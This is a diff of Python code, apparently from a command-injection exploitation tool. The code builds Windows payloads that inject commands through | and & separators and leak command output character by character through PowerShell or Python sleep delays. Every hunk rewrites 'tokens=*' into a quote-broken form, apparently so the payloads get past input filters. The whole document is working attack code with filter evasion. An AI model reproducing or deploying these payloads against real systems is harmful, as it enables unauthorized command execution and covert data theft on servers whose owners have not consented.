@@ -30,7 +30,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       pipe = "|"
       payload = (pipe +
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
@@ -45,7 +45,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
         ampersand = "&"
       payload = (ampersand +
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + ""
-                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
@@ -119,7 +119,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
       pipe = "|"
       payload = (pipe + " "
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
@@ -133,7 +133,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
         ampersand = "&"
       payload = (ampersand +
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + ""
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
@@ -208,17 +208,17 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
                 ">" + OUTPUT_TEXTFILE + "< nul" + pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\" " +
                 # Transform to ASCII
                 pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
                 "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"') "
                 "do @set /p =%i>" + OUTPUT_TEXTFILE + "< nul) "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
@@ -230,17 +230,17 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       else:
         ampersand = "&"
       payload = (ampersand + " "
-               "for /f \"tokens=*\" %i in ('cmd /c \"" +
+               "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
                 ">" + OUTPUT_TEXTFILE + "< nul" + ampersand + ""
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\" " +
                 # Transform to ASCII
                 ampersand + ""
-                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
                 "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"') "
                 "do @set /p =%i>" + OUTPUT_TEXTFILE + "< nul) "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
@@ -324,11 +324,11 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
     if separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do @set /p =%i" +
                 ">" + OUTPUT_TEXTFILE + "< nul " + pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -341,11 +341,11 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
       else:
         ampersand = "&"
       payload = (ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do @set /p =%i" +
                 ">" + OUTPUT_TEXTFILE + "< nul " + ampersand + ""
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -419,7 +419,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     if separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                 " do if %i==" +str(ascii_char)+ " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
@@ -432,7 +432,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       else:
         ampersand = "&"
       payload = (ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                 " do if %i==" +str(ascii_char)+ " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
@@ -501,7 +501,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -514,7 +514,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
       else:
         ampersand = "&"
       payload = (ampersand + "" 
-                "for /f \"tokens=*\" %i in ('cmd /c " + 
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -580,7 +580,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
@@ -594,7 +594,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       else:
         ampersand = "&"
       payload = (ampersand + "" 
-                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
@@ -656,7 +656,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
-                "for /f \"tokens=*\" %i in ('cmd /c " +
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
@@ -669,7 +669,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
       else:
         ampersand = "&"
       payload = (ampersand + "" 
-                "for /f \"tokens=*\" %i in ('cmd /c " + 
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
